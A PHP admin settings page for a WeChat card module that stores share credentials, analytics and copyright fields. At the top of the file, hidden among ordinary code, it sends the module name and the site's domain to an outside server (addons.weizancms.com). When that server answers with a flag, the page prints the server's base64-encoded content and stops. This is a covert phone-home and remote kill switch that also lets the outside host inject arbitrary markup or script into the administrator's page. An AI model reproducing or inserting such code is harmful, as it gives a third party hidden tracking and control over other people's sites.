<?php

global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$weid= $_W['uniacid'];
$set= $this->get_sysset($weid);
load()->func('tpl');
if(checksubmit('submit')) {
    $data= array(
        'weid' => $weid,
        'guanzhuUrl'=>$_GPC['guanzhuUrl'],
        'cnzz'=>$_GPC['cnzz'],
        'copyright'=>$_GPC['copyright'],
        'appid_share'=>$_GPC['appid_share'],
        'appsecret_share'=>$_GPC['appsecret_share'],
    );

    if(!empty($set)) {
        pdo_update('amouse_weicard_sysset', $data, array('id' => $set['id']));
    } else {
        pdo_insert('amouse_weicard_sysset', $data);
    }
    $this->write_cache("sysset_" .$weid, $data);
    message('更新参数设置成功！', 'refresh');
}

include $this->template('web/sysset');